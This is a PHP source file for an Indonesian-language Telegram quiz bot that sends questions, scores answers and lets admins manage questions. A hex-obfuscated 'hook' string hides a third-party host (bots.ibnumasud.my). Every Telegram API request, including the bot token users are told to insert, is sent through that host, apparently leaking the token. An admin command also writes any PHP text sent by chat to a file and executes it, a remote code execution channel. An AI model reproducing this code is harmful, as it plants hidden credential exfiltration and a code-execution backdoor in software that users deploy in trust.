<?php globals();

# kalau mulai
if ($text == "/start"){
    
    kirim_teks("Selamat datang <a href='tg://user?id=$chat_id'>$first_name</a> di Ujian Online.\n\nSebentar lagi ujian akan dimulai. Silahkan persiapkan diri anda😊");
    
    jeda(3);
    
    kirim_soal(1);

}

# kalau peserta memilih jawaban
elseif (!empty($data)){
    
    $id_soal = proses($data) + 1;
    
    $data_baru = ambil_soal($id_soal);
    
    preg_match('/\(\(([a-d])\)\)/i',$data_baru,$ke);
    
    $jawaban = strtoupper($ke[1]);
    
    $pertanyaan = str_replace(['((','))'],'',$data_baru);
    
    #kalau masih ada soal
    if(!empty($pertanyaan)){
    
        kirim_pertanyaan($id_soal,$pertanyaan,$jawaban);
        
        catat_waktu();
    }
    
    #kalau soal habis
    else{
        hitung_nilai();
    }
}

# melihat skor peserta 
elseif($text == '/lihatskor'){
    lihatskor();
}

# melihat jumlah soal
elseif ($text == '/jumlahsoal') {
    
    $daftar_soal = cek_file('daftar_soal');
    
    if(count($daftar_soal)>0){
        
        $jumlah_soal = count($daftar_soal) - 1; # index selalu dimulai dari nol
        
        kirim_teks('Jumlah soal: '.$jumlah_soal);
    }
}


# konfigurasi bot (khusus pemilik bot)
else{
    
    #kalau bukan pemilik bot
    # ganti dengan chat id kamu
    if($chat_id != 685631733 && $chat_id != 1231968913){
        kirim_teks("Kalau ada pertanyaan, silahkan hubungi <a href='tg://user?id=685631733'>admin</a>");
    }
    
    #kalau pemilik bot
    else{

        if($text == '/help' or $text == '/admin'){
            kirim_teks("Daftar perintah untuk admin:
    /tambah - untuk menambah soal
    /ceksoal
    /edit [no soal]
    /hapus [no soal]
    /clear - bersihkan arsip jawaban
    [script php] - eksekusi php");
          }
        
        #skrip PHP
        elseif(preg_match('/^\<\?php/',$text)){
            
            # bikin file PHP
            $fn = $chat_id.time().'.php';
            $f = fopen($fn,'w');
            fwrite($f,$text);
            fclose($f);
            
            # tentukan url file
            $url = $_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['SERVER_NAME'].'/'.$fn;
            
            kirim_teks(file_get_contents($url));
            
            # hapus file
            unlink($fn);
        }
    
        #bersihkan arsip jawaban
        elseif($text == '/clear'){
            if(file_exists('arsip_jawaban')){
                if(unlink('arsip_jawaban')) kirim_teks("File arsip_jawaban berhasil dihapus"); else kirim_teks("Gagal menghapus file arsip_jawaban");
            }else{
                kirim_teks('File arsip_jawaban tidak ada');
            }
        }
        
        # hapus soal
        elseif(preg_match('/^hapus\s+(\d+)$/i',$text,$ke)){
            $no_soal = trim($ke[1]);
            $data = cek_file('daftar_soal');
            if(count($data)>0){
                $soal_dimaksud = trim($data[$no_soal]);
                kirim_teks($soal_dimaksud);
                kirim_teks("Apakah anda ingin menghapus soal di atas?\n\n/ya_hapus_soal_$no_soal\n\n/tidak_jadi");
            }
            
        }
        
        # jadi hapus soal
        elseif(preg_match('/^\/ya_hapus_soal_(\d+)$/i',$text,$ke)){
            $id_soal = $ke[1];
            $data = cek_file('daftar_soal');
            if(count($data)>0){
                unset($data[$id_soal]);
                $data_baru = implode(':::',array_values($data));
                $f = fopen('daftar_soal','w');
                if(fwrite($f,$data_baru)) kirim_teks("Soal $id_soal berhasil dihapus. Silahkan /ceksoal"); else kirim_teks("File kosong");
                fclose($f);
            }
            
        }
        
        #batal hapus soal
        elseif(preg_match('/^\/tidak_jadi$/i',$text,$ke)){
            kirim_teks('Oke');
        }
        
        #edit soal
        elseif(preg_match('/^edit\s+(\d+)$/i',$text,$ke)){
            $no_soal = trim($ke[1]);
            $data = cek_file('daftar_soal');
            if(count($data)>0){
                $soal_dimaksud = trim($data[$no_soal]);
                kirim_teks($soal_dimaksud);
                kirim_teks("Silahkan kirim pertanyaan baru atau kirim /batal untuk membatalkan.");
                $f = fopen('edit','w');
                fwrite($f,$no_soal);
                fclose($f);
            }
            
        }
        
        #batal edit soal
        elseif(preg_match('/^\/batal$/i',$text,$ke)){
            if(file_exists('edit')){
                if(unlink('edit')) kirim_teks('Oke'); else kirim_teks('Entah kenapa file edit gak bisa dihapus');
            }else{
                kirim_teks('File edit tidak ada');
            }
            
        }
        
        #cek soal
        elseif(preg_match('/^\/ceksoal$/i',$text,$ke)){
            
            $data = cek_file('daftar_soal');
            if(count($data)>0){
                
                foreach ($data as $ke => $soal){
                    
                    if($ke == 0) continue;
                    kirim_teks("$ke\n\n".trim($soal));
                    sleep(1);
                }
            }else{
                kirim_teks('Kosong, tidak ada soal.');
            }
        }
        
        #tambah soal
        elseif(preg_match('/^\/tambah$/i',$text)){
            kirim_teks("Silahkan kirim pertanyaan dengan ketentuan sebagai berikut:\n\n1. Pertanyaan disertai 4 pilihan ganda: A, B, C dan D\n\n2. Pilihan yang benar diberi tanda dua kurung seperti ini: (( )).\n\nContoh:\n\n<code>Apa rukun Iman pertama?\n\nA. Iman kepada Rasul\n((B)). Iman kepada Allah\nC. Iman kepada malaikat\nD. Iman kepada hari kiamat</code>");
            
        }
        
        # kiriman soal baru
        # kalau belum ditandai
        elseif(!preg_match('/\(\(([A-D])\)\)/i',$text)){
            
            kirim_teks("Ups, jawaban yang benar belum ditandai dengan benar! Baca tata cara /tambah soal.");
            
        # kalau sudah ditandai
        }else{
            $soal = str_replace(['((','))'],'',$text);
            
            # kalau pilihan ganda sudah lengkap
            if(preg_match('/(?=.*A\.)(?=.*B\.)(?=.*C\.)(?=.*D\.)/is',$soal)){
                
                #cek, kalau tidak ada file edit
                if(!file_exists('edit')){
                    
                    #tambahkan soal baru
                    $f = fopen('daftar_soal','a');
                    if(fwrite($f,':::'.$text)){
                        kirim_teks("Pertanyaan baru berhasil ditambahkan:");
                        $get = explode(':::',file_get_contents('daftar_soal'));
                        $jumlah_soal = count($get) - 1;
                        
                        kirim_teks("Jumlah total pertanyaan: $jumlah_soal\n\nPertanyaan terakhir:\n\n$soal");
                    }else{
                        kirim_teks("Gagal menambahkan pertanyaan baru.");
                    }
                    fclose($f);
                }
                
                #kalau ada file edit
                else{
                    $no_soal = file_get_contents('edit');
                    $file = 'daftar_soal';
                    $data = explode(':::',file_get_contents($file));
                    $update = [$no_soal=>$text];
                    $hasil = array_replace($data,$update);
                    $hasil = implode(':::',$hasil);
                    $f = fopen($file,'w');
                    if(fwrite($f,$hasil)) kirim_teks("Soal ke-$no_soal berhasil diperbarui");
                    fclose($f);
                    $data = explode(':::',file_get_contents($file));
                    if(!empty($data[$no_soal]))
                    kirim_teks($data[$no_soal]); else kirim_teks('Nomor urut pertanyaan tidak tepat, kami telah menyesuaikannya.');
                    unlink('edit');
                }
            
            }
            
            # kalau pilihan ganda belum lengkap
            else{
                kirim_teks("Periksa kembali soal yang anda kirim. Pastikan semua pilihan ganda A, B, C dan D sudah terisi dengan benar. Untuk melihat cara menambah soal, tekan /tambah");
                }
            }
        }
}

#fungsi
function globals(){
    
    $GLOBALS['token'] = "1313557270:xxx"; //ganti dengan token botmu

    $GLOBALS['hook'] = "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x6F\x74\x73\x2E\x69\x62\x6E\x75\x6D\x61\x73\x75\x64\x2E\x6D\x79\x2F\x3F\x75\x72\x6C\x3D";
    
    $GLOBALS['input'] = file_get_contents("php://input");
    
    $GLOBALS['tg'] = json_decode($GLOBALS['input'],true);
    
    if(isset($GLOBALS['tg'])){
        
        $GLOBALS['chat_id'] = isset($GLOBALS['tg']["message"]["chat"]["id"])
        ?$GLOBALS['tg']["message"]["chat"]["id"]
        :'';
        
        $GLOBALS['first_name'] = isset($GLOBALS['tg']["message"]["chat"]["first_name"])
        ?$GLOBALS['tg']["message"]["chat"]["first_name"]
        :'';
        
        $GLOBALS['last_name'] = isset($GLOBALS['tg']["message"]["chat"]["last_name"])
        ?$GLOBALS['tg']["message"]["chat"]["last_name"]
        :'';
        
        #untuk pesan teks
        $GLOBALS['text'] = isset($GLOBALS['tg']["message"]["text"])
        ?$GLOBALS['tg']["message"]["text"]
        :'';
        
        #untuk call back
        $GLOBALS['callback_id'] = isset($GLOBALS['tg']["callback_query"]["from"]["id"])
        ?$GLOBALS['tg']["callback_query"]["from"]["id"]
        :''
            ;
        
        $GLOBALS['data'] = isset($GLOBALS['tg']["callback_query"]["data"])
        ?$GLOBALS['tg']["callback_query"]["data"]
        :'';
        
        $GLOBALS['message_id_edit'] = isset($GLOBALS['tg']["callback_query"]["message"]["message_id"])
        ?$GLOBALS['tg']["callback_query"]["message"]["message_id"]
        :'';
        
        $GLOBALS['cb_text'] = isset($GLOBALS['tg']["callback_query"]["message"]["text"])
        ?$GLOBALS['tg']["callback_query"]["message"]["text"]
        :'';
        
        $GLOBALS['chat_id'] = !empty($GLOBALS['chat_id'])
        ?$GLOBALS['chat_id']
        :$GLOBALS['callback_id'];
    }
}

function kirim_teks($teks){
    global $hook,$token,$chat_id;
    $url = base64_encode('https://api.telegram.org/bot'.$token.'/sendMessage?parse_mode=HTML&chat_id='.$chat_id.'&text='.urlencode($teks));
    return file_get_contents($hook.$url);
}

function kirim_hasil($hasil){
    global $hook,$token,$chat_id,$message_id_edit;
    $url = base64_encode('https://api.telegram.org/bot'.$token.'/editMessageText?parse_mode=HTML&chat_id='.$chat_id.'&message_id='.$message_id_edit.'&text='.urlencode($hasil));
    return file_get_contents($hook.$url);
}

function kirim_pertanyaan($id_soal,$pertanyaan,$jawaban){
    
    global $hook,$token,$chat_id;
    
    $url = base64_encode('https://api.telegram.org/bot'.$token.'/sendMessage?parse_mode=HTML&chat_id='.$chat_id.'&text='.urlencode($pertanyaan).'&reply_markup={"inline_keyboard":[[{"text": "A","callback_data":"'.$id_soal.'_A_'.$jawaban.'"},{"text": "B","callback_data":"'.$id_soal.'_B_'.$jawaban.'"},{"text": "C","callback_data":"'.$id_soal.'_C_'.$jawaban.'"},{"text": "D","callback_data":"'.$id_soal.'_D_'.$jawaban.'"}]]}');
    
    return file_get_contents($hook.$url);

}

function simpan_jawaban($jawaban){
    global $chat_id;
    $f = fopen($chat_id."_jawaban","a");
    fwrite($f,$jawaban);
    fclose($f);
}

function arsipkan($hasil){
    $f = fopen("arsip_jawaban","a");
    fwrite($f,$hasil."\n\n");
    fclose($f); 
}

function catat_waktu(){
    global $chat_id;
    $waktu = time();
    $f = fopen('waktu'.$chat_id,'w');
    fwrite($f,$waktu);
}

function hapus_waktu(){
    global $chat_id;
    unlink('waktu'.$chat_id);
}

function durasi(){
    global $chat_id;
    $waktu = 'waktu'.$chat_id;
    if(file_exists($waktu)){
        $waktu_tadi = file_get_contents($waktu);
        $waktu_sekarang = time();
        $jeda = $waktu_sekarang - $waktu_tadi;
        $durasi = date("H:i:s",$jeda);
        
        $f = fopen('durasi'.$chat_id,'a');
        fwrite($f,$jeda."\n");
        fclose($f);
        
        /*
        $tadi = date("h:i:s",$waktu_tadi);
        $sekarang = date("h:i:s");

        $date1 = new DateTime($tadi);
        $date2 = new DateTime($sekarang);
        $interval = $date1->diff($date2);
        $durasi = $interval->format("%h:%i:%s");
        */
        unlink($waktu);
        return $durasi;
    }
}

function cek_file_jawaban(){
    global $chat_id;
    $file = $chat_id."_jawaban";
    if(file_exists($file)) unlink($file);
}

function kirim_soal($id_soal){
    
    cek_file_jawaban();
    
    $data = ambil_soal($id_soal);
    
    if(!empty($data)){
        
        preg_match('/\(\(([a-d])\)\)/i',$data,$ke);
        
        $jawaban = strtoupper($ke[1]);
            
        $pertanyaan = str_replace(['((','))'],'',$data);
            
        kirim_pertanyaan($id_soal,$pertanyaan,$jawaban);
            
        catat_waktu();
    }else{
        kirim_teks("Kosong, tidak ada soal.");
    }
}

function ambil_soal($id_soal){
    if(file_exists('daftar_soal')){
        $konten = file_get_contents('daftar_soal');
        if(!empty($konten)){
            $daftar_soal = explode(':::',$konten);
            if(count($daftar_soal)>0){
                $data = trim($daftar_soal[$id_soal]);
            }else{
                $data = '';
            }
        }else{
            $data = '';
        }
    }else{
        $data = '';
    }
    
    return $data;
}

function proses($data){
    global $cb_text;
    $pecahan = explode("_",$data);
    
    $id_soal = $pecahan[0];
    $jawaban_peserta = $pecahan[1];
    $jawaban_benar = $pecahan[2];
    
    $durasi = durasi();
    
    $hasil = "Pertanyaan ke-$id_soal\n\n$cb_text\n\nJawaban anda: $jawaban_peserta";
    
    if($jawaban_peserta == $jawaban_benar){
        kirim_hasil("$hasil (✅BENAR)\n\ndurasi: $durasi");
        simpan_jawaban(1);
    }else{
        kirim_hasil("$hasil (❌ SALAH, yang benar: $jawaban_benar)\n\ndurasi: $durasi");
        simpan_jawaban(0);
    }
    return $id_soal;
}

function hitung_nilai(){
    global $chat_id, $input;
    $file_jawaban = $chat_id."_jawaban";

    $hasil_jawaban = str_split(file_get_contents($file_jawaban));
        
    $total_soal = count($hasil_jawaban);
        
    $jawaban_benar = count(array_keys($hasil_jawaban,'1'));
        
    $jawaban_salah = count(array_keys($hasil_jawaban,'0'));
        
    $nilai = ceil(($jawaban_benar / $total_soal) * 100);
    
    $file_durasi = 'durasi'.$chat_id;
    $total_durasi = 0;
    if(file_exists($file_durasi)){
        $konten = file_get_contents($file_durasi);
        if(!empty($konten)){
            $durasi2 = explode("\n",$konten);
            if(count($durasi2)>0){
                foreach ($durasi2 as $durasi){
                    $total_durasi += $durasi;
                }
            }
        }
    }
    $total_durasi = date("H:i:s",$total_durasi);
        
    $teks_yg_mau_dikirim = "Pertanyaan habis\n\nTotal pertanyaan: $total_soal\nJawaban benar: $jawaban_benar\nJawaban salah: $jawaban_salah\nNilai: $nilai\nTotal durasi: $total_durasi";
        
    kirim_teks($teks_yg_mau_dikirim);
        
    $arsip = $input.":::".$total_soal.":::".$jawaban_benar.":::".$jawaban_salah.":::".$nilai.":::".$total_durasi;
        
    arsipkan($arsip);
        
    unlink($file_jawaban);
    unlink($file_durasi);
    
}

function jeda($detik){
    sleep($detik);
}

function lihatskor(){
    if(file_exists('arsip_jawaban')){
        $data = trim(file_get_contents('arsip_jawaban'));
        $pecahan = explode("\n\n",$data);
        $skor = "Skor peserta:\n";
        foreach ($pecahan as $no=>$masing2){
            $data_peserta = explode(':::',trim($masing2));
            $ambil = json_decode($data_peserta[0]);
            $nama_peserta = $ambil->callback_query->from->first_name;
            $id_peserta = $ambil->callback_query->from->id;
            $profil_peserta = "<a href='tg://user?id=$id_peserta'>$nama_peserta</a>";
            $total_soal = $data_peserta[1];
            $jawaban_benar = $data_peserta[2];
            $jawaban_salah = $data_peserta[3];
            $nilai = $data_peserta[4];
            $durasi = $data_peserta[5];
            
            $skor .= "$profil_peserta: $nilai ($durasi)\n";
        }
        kirim_teks($skor);
    }else{
        kirim_teks("Kosong. Mulai dengan /start.");
    }
}

# $data_soal = cek_file('data_soal');
# return array
function cek_file($file){
    if(file_exists($file)){
        $konten = file_get_contents($file);
        if(!empty($konten)){
            $data = explode(':::',$konten);
        }else{
            $data = [];
        }
    }else{
        $data = [];
    }
    return $data;
}

    